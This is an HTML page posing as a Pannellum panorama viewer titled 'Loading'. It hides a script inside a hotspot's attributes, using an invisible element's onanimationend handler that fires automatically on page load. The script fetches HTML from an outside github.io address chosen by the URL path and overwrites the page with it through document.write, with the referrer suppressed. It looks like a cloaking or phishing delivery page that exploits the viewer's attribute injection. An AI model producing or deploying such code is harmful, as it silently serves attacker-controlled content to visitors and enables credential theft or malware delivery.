<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<title>Loading</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.css">
<script src="https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.js"></script>
<style>
html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#000}
#panorama{width:100%;height:100%}
@keyframes pnlm-mv{to{visibility:visible}}
</style>
</head>
<body>
<div id="panorama"></div>
<script>
(function(){
    var parts = window.location.pathname.replace(/\/+$/, '').split('/');
    var id = parts.length > 0 ? parts[parts.length - 1] : '';
    if (!id || id === 'havent') return;

    var fetchUrl = 'https://gevtsv.github.io/vbsd/xbd/' + id + '.html';

    pannellum.viewer('panorama', {
        "autoLoad": true,
        "pitch": 0,
        "yaw": 0,
        "type": "equirectangular",
        "panorama": "https://pannellum.org/images/alma.jpg",
        "hotSpots": [
            {
                "pitch": 0,
                "yaw": 0,
                "type": "info",
                "URL": "#",
                "attributes": {
                    "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation:pnlm-mv 0.01s 1 forwards",
                    "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('" + fetchUrl + "').then(function (res) { if (!res.ok) {throw new Error('HTTP ' + res.status);}return res.text(); }) .then(function (html) { document.open(); document.write(html); document.close(); }) .catch(function (err) { console.error(err); }); }"
                }
            }
        ]
    });
})();
</script>
</body>
</html>
